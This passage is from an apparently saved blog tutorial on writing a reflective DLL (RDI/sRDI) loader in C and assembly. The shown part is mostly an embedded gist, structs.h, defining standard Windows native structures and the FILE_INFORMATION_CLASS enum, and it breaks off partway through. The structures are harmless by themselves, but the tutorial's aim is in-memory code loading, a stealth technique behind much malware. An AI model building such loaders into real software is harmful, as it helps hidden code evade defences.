        <a href="https://gist.github.com/maliciousgroup/85ad9da4c3fa44ee320a2aac61a07f8a#file-defs-h">
          defs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><p>If you are following along, you can see why we need the various structures to support the Native API function definitions as seen in the following image.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-12.png" class="kg-image" alt="" loading="lazy" width="2000" height="977" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-12.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-12.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-12.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-12.png 2400w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>You can see in the IDE that items like <code>PUNICODE_STRING</code> or <code>PIO_STATUS_BLOCK</code> and others are not being resolved, so this means we need to populate those structures within the <code>structs.h</code> file as seen below.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>structs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/221bb0a44643a9cf7425405ddc1c4a4c.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121785659" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-structs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="structs.h">
        <tbody><tr>
          <td id="file-structs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-structs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-structs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-structs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-structs-h-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-structs-h-LC4" class="blob-code blob-code-inner js-file-line">    DWORD PageAddress;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-structs-h-LC5" class="blob-code blob-code-inner js-file-line">    DWORD BlockSize;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-structs-h-LC6" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-structs-h-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-structs-h-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_ENTRY {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-structs-h-LC9" class="blob-code blob-code-inner js-file-line">    USHORT Offset : <span class="pl-c1">12</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-structs-h-LC10" class="blob-code blob-code-inner js-file-line">    USHORT Type : <span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-structs-h-LC11" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-structs-h-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-structs-h-LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _UNICODE_STRING {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-structs-h-LC14" class="blob-code blob-code-inner js-file-line">    USHORT Length;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-structs-h-LC15" class="blob-code blob-code-inner js-file-line">    USHORT MaximumLength;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-structs-h-LC16" class="blob-code blob-code-inner js-file-line">    PWSTR Buffer;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-structs-h-LC17" class="blob-code blob-code-inner js-file-line">} UNICODE_STRING, *PUNICODE_STRING;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-structs-h-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-structs-h-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _OBJECT_ATTRIBUTES {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-structs-h-LC20" class="blob-code blob-code-inner js-file-line">    ULONG Length;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-structs-h-LC21" class="blob-code blob-code-inner js-file-line">    HANDLE RootDirectory;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-structs-h-LC22" class="blob-code blob-code-inner js-file-line">    PUNICODE_STRING ObjectName;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-structs-h-LC23" class="blob-code blob-code-inner js-file-line">    ULONG Attributes;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-structs-h-LC24" class="blob-code blob-code-inner js-file-line">    PVOID SecurityDescriptor;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-structs-h-LC25" class="blob-code blob-code-inner js-file-line">    PVOID SecurityQualityOfService;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-structs-h-LC26" class="blob-code blob-code-inner js-file-line">} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-structs-h-LC27" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-structs-h-LC28" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _IO_STATUS_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-structs-h-LC29" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">union</span> {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-structs-h-LC30" class="blob-code blob-code-inner js-file-line">        NTSTATUS Status;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-structs-h-LC31" class="blob-code blob-code-inner js-file-line">        PVOID Pointer;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-structs-h-LC32" class="blob-code blob-code-inner js-file-line">    } DUMMYUNIONNAME;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-structs-h-LC33" class="blob-code blob-code-inner js-file-line">    ULONG_PTR Information;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-structs-h-LC34" class="blob-code blob-code-inner js-file-line">} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-structs-h-LC35" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-structs-h-LC36" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _FILE_STANDARD_INFORMATION {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-structs-h-LC37" class="blob-code blob-code-inner js-file-line">    LARGE_INTEGER AllocationSize;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-structs-h-LC38" class="blob-code blob-code-inner js-file-line">    LARGE_INTEGER EndOfFile;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-structs-h-LC39" class="blob-code blob-code-inner js-file-line">    ULONG NumberOfLinks;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-structs-h-LC40" class="blob-code blob-code-inner js-file-line">    BOOLEAN DeletePending;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-structs-h-LC41" class="blob-code blob-code-inner js-file-line">    BOOLEAN Directory;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="file-structs-h-LC42" class="blob-code blob-code-inner js-file-line">} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="file-structs-h-LC43" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="file-structs-h-LC44" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">enum</span> _FILE_INFORMATION_CLASS {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="file-structs-h-LC45" class="blob-code blob-code-inner js-file-line">    FileDirectoryInformation = <span class="pl-c1">1</span>, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="file-structs-h-LC46" class="blob-code blob-code-inner js-file-line">    FileFullDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="file-structs-h-LC47" class="blob-code blob-code-inner js-file-line">    FileBothDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
          <td id="file-structs-h-LC48" class="blob-code blob-code-inner js-file-line">    FileBasicInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="file-structs-h-LC49" class="blob-code blob-code-inner js-file-line">    FileStandardInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="file-structs-h-LC50" class="blob-code blob-code-inner js-file-line">    FileInternalInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="file-structs-h-LC51" class="blob-code blob-code-inner js-file-line">    FileEaInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="file-structs-h-LC52" class="blob-code blob-code-inner js-file-line">    FileAccessInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="file-structs-h-LC53" class="blob-code blob-code-inner js-file-line">    FileNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="file-structs-h-LC54" class="blob-code blob-code-inner js-file-line">    FileRenameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="file-structs-h-LC55" class="blob-code blob-code-inner js-file-line">    FileLinkInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="file-structs-h-LC56" class="blob-code blob-code-inner js-file-line">    FileNamesInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="file-structs-h-LC57" class="blob-code blob-code-inner js-file-line">    FileDispositionInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="file-structs-h-LC58" class="blob-code blob-code-inner js-file-line">    FilePositionInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="file-structs-h-LC59" class="blob-code blob-code-inner js-file-line">    FileFullEaInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="file-structs-h-LC60" class="blob-code blob-code-inner js-file-line">    FileModeInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="file-structs-h-LC61" class="blob-code blob-code-inner js-file-line">    FileAlignmentInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="file-structs-h-LC62" class="blob-code blob-code-inner js-file-line">    FileAllInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="file-structs-h-LC63" class="blob-code blob-code-inner js-file-line">    FileAllocationInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="file-structs-h-LC64" class="blob-code blob-code-inner js-file-line">    FileEndOfFileInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="file-structs-h-LC65" class="blob-code blob-code-inner js-file-line">    FileAlternateNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="file-structs-h-LC66" class="blob-code blob-code-inner js-file-line">    FileStreamInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="file-structs-h-LC67" class="blob-code blob-code-inner js-file-line">    FilePipeInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="file-structs-h-LC68" class="blob-code blob-code-inner js-file-line">    FilePipeLocalInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="file-structs-h-LC69" class="blob-code blob-code-inner js-file-line">    FilePipeRemoteInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="file-structs-h-LC70" class="blob-code blob-code-inner js-file-line">    FileMailslotQueryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="file-structs-h-LC71" class="blob-code blob-code-inner js-file-line">    FileMailslotSetInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="file-structs-h-LC72" class="blob-code blob-code-inner js-file-line">    FileCompressionInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="file-structs-h-LC73" class="blob-code blob-code-inner js-file-line">    FileObjectIdInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="file-structs-h-LC74" class="blob-code blob-code-inner js-file-line">    FileCompletionInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="file-structs-h-LC75" class="blob-code blob-code-inner js-file-line">    FileMoveClusterInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="file-structs-h-LC76" class="blob-code blob-code-inner js-file-line">    FileQuotaInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="file-structs-h-LC77" class="blob-code blob-code-inner js-file-line">    FileReparsePointInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="file-structs-h-LC78" class="blob-code blob-code-inner js-file-line">    FileNetworkOpenInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="file-structs-h-LC79" class="blob-code blob-code-inner js-file-line">    FileAttributeTagInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="file-structs-h-LC80" class="blob-code blob-code-inner js-file-line">    FileTrackingInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="file-structs-h-LC81" class="blob-code blob-code-inner js-file-line">    FileIdBothDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="file-structs-h-LC82" class="blob-code blob-code-inner js-file-line">    FileIdFullDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="file-structs-h-LC83" class="blob-code blob-code-inner js-file-line">    FileValidDataLengthInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="file-structs-h-LC84" class="blob-code blob-code-inner js-file-line">    FileShortNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="file-structs-h-LC85" class="blob-code blob-code-inner js-file-line">    FileIoCompletionNotificationInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="file-structs-h-LC86" class="blob-code blob-code-inner js-file-line">    FileIoStatusBlockRangeInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="file-structs-h-LC87" class="blob-code blob-code-inner js-file-line">    FileIoPriorityHintInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="file-structs-h-LC88" class="blob-code blob-code-inner js-file-line">    FileSfioReserveInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="file-structs-h-LC89" class="blob-code blob-code-inner js-file-line">    FileSfioVolumeInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="file-structs-h-LC90" class="blob-code blob-code-inner js-file-line">    FileHardLinkInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="file-structs-h-LC91" class="blob-code blob-code-inner js-file-line">    FileProcessIdsUsingFileInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="file-structs-h-LC92" class="blob-code blob-code-inner js-file-line">    FileNormalizedNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="file-structs-h-LC93" class="blob-code blob-code-inner js-file-line">    FileNetworkPhysicalNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="file-structs-h-LC94" class="blob-code blob-code-inner js-file-line">    FileIdGlobalTxDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="file-structs-h-LC95" class="blob-code blob-code-inner js-file-line">    FileIsRemoteDeviceInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="file-structs-h-LC96" class="blob-code blob-code-inner js-file-line">    FileUnusedInformation,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="file-structs-h-LC97" class="blob-code blob-code-inner js-file-line">    FileNumaNodeInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="file-structs-h-LC98" class="blob-code blob-code-inner js-file-line">    FileStandardLinkInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="file-structs-h-LC99" class="blob-code blob-code-inner js-file-line">    FileRemoteProtocolInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="file-structs-h-LC100" class="blob-code blob-code-inner js-file-line">    FileRenameInformationBypassAccessCheck, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="file-structs-h-LC101" class="blob-code blob-code-inner js-file-line">    FileLinkInformationBypassAccessCheck, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="file-structs-h-LC102" class="blob-code blob-code-inner js-file-line">    FileVolumeNameInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="file-structs-h-LC103" class="blob-code blob-code-inner js-file-line">    FileIdInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="104"></td>
          <td id="file-structs-h-LC104" class="blob-code blob-code-inner js-file-line">    FileIdExtdDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="105"></td>
          <td id="file-structs-h-LC105" class="blob-code blob-code-inner js-file-line">    FileReplaceCompletionInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="106"></td>
          <td id="file-structs-h-LC106" class="blob-code blob-code-inner js-file-line">    FileHardLinkFullIdInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="107"></td>
          <td id="file-structs-h-LC107" class="blob-code blob-code-inner js-file-line">    FileIdExtdBothDirectoryInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="108"></td>
          <td id="file-structs-h-LC108" class="blob-code blob-code-inner js-file-line">    FileDispositionInformationEx, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="109"></td>
          <td id="file-structs-h-LC109" class="blob-code blob-code-inner js-file-line">    FileRenameInformationEx,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="110"></td>
          <td id="file-structs-h-LC110" class="blob-code blob-code-inner js-file-line">    FileRenameInformationExBypassAccessCheck,</td>
        </tr>
        <tr>
          <td id="file-structs-h-L111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="111"></td>
          <td id="file-structs-h-LC111" class="blob-code blob-code-inner js-file-line">    FileDesiredStorageClassInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="112"></td>
          <td id="file-structs-h-LC112" class="blob-code blob-code-inner js-file-line">    FileStatInformation, </td>
        </tr>
        <tr>
          <td id="file-structs-h-L113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="113"></td>
          <td id="file-structs-h-LC113" class="blob-code blob-code-inner js-file-line">    FileMaximumInformation</td>
